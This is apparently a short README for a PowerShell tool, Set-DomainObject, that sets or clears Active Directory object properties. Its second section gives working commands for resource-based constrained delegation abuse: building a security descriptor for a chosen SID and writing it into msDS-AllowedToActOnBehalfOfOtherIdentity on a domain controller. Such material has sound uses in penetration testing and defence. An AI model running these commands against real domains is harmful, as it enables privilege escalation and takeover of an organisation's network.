# Set-DomainObject
Modify or clear a property for a specified active directory object - Necessary rights required

### Usage
```
Set-DomainObject -Identity Senna -Set @{'mail' = "something@test.com"}
```
```
Set-DomainObject -Identity Senna -Clear @{'mail'}
```
![image](https://github.com/Leo4j/Set-DomainObject/assets/61951374/9385a6f7-446b-4c1a-9b1e-5f74e2b6f004)


# RBCD (Resource Based Constrained Delegation)
The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format.
```
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
```
```
$rsdb = New-Object byte[] ($rsd.BinaryLength)
```
```
$rsd.GetBinaryForm($rsdb, 0)
```
```
Set-DomainObject -Identity DC01$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb}
```
